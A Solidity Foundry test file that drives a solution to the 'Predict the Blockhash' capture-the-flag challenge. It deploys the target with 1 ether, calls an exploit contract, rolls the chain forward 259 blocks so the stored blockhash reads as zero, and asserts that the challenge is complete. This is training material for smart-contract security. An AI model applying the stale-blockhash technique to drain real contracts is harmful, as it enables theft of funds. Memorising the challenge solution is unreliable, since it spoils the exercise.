// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import "forge-std/Test.sol";
import "forge-std/console.sol";

import "../src/PredictTheBlockhash.sol";

contract PredictTheBlockhashTest is Test {
    PredictTheBlockhash public predictTheBlockhash;
    ExploitContract public exploitContract;

    function setUp() public {
        // Deploy contracts
        predictTheBlockhash = (new PredictTheBlockhash){value: 1 ether}();
        exploitContract = new ExploitContract(predictTheBlockhash);
    }

    function testExploit() public {
        // Set block number
        uint256 blockNumber = block.number;
        // To roll forward, add the number of blocks to blockNumber,
        // Eg. roll forward 10 blocks: blockNumber + 10
        vm.roll(blockNumber + 1);
        
        // Put your solution here
        exploitContract.exploit{value: 1 ether}();
        // in the future block call settle
        vm.roll(blockNumber + 259);
        exploitContract.guess();
        
        _checkSolved();
    }

    function _checkSolved() internal {
        assertTrue(predictTheBlockhash.isComplete(), "Challenge Incomplete");
    }

    receive() external payable {}
}
